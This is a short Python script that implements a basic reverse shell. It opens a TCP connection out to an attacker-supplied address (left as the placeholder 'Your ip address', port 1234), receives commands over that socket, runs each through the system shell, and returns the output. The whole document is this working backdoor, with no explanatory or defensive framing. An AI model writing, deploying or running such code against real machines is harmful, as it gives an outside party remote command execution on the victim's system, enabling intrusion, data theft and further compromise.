import socket
import subprocess
def execute(command):
    return subprocess.check_output(command,shell=True)
connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("Your ip address",1234))
while True:
    command=connection.recv(1024).decode()
    command_result=execute(command)
    connection.send(command_result)
    